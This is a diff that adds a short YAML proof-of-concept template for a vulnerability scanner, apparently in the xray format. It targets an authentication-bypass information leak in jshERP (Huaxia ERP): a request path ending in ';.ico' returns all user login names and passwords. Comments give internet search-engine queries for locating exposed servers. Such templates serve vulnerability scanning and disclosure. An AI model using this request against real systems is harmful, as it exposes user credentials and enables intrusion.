@@ -1,0 +1,21 @@
+name: poc-yaml-huaxia-xielou
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /jshERP-boot/user/getAllList;.ico
+      follow_redirects: false
+      headers:
+        User-Agent: >-
+          Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/114.0.0.0 Safari/537.36
+    expression: >-
+      response.status == 200 && response.body_string.contains("loginName") &&
+      response.body_string.contains("password") 
+expression: r0()
+detail:
+  author: hy
+  #华夏erp泄露
+#fofa语法："jshERP-boot"
+#hunter: web.icon=="f6efcd53ba2b07d67ab993073c238a11"
